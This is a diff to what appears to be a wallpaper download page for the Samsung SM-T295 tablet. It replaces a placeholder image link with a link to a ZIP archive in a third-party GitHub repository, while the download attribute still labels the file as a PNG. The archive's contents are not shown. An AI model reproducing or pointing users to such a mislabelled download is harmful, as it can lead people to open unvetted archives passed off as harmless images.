@@ -6,7 +6,7 @@ Welcome! Here you can view and download the official wallpaper for the Samsung G
 
 <br>
 
-<a href="https://via.placeholder.com/800x1280.png?text=SM-T295+Wallpaper" download="wallpaper-sm-t295-samsung.png">
+<a href="(https://github.com/dapdgh/Wallpaper-SM-T295/raw/refs/heads/main/wallpaper.zip)" download="wallpaper-sm-t295-samsung.png">
   <button style="padding: 10px 24px; font-size: 18px; margin-top:16px;">Download Wallpaper</button>
 </a>
 
